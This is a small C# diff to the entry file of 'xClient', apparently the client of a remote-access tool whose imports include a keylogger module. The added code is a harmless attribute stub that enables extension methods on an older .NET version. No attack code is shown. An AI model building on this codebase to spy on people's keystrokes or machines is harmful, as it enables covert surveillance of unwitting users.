@@ -8,6 +8,15 @@ using xClient.Core.Commands;
 using xClient.Core.Keylogger;
 using xClient.Core.Packets;
 
+namespace System.Runtime.CompilerServices
+{
+    // With this namespace defined along with this attribute stub, we now
+    // have access to the power of extension methods for the whole client!
+    // :)
+    [AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Class | AttributeTargets.Method)]
+    public sealed class ExtensionAttribute : Attribute { }
+}
+
 namespace xClient
 {
     internal static class Program
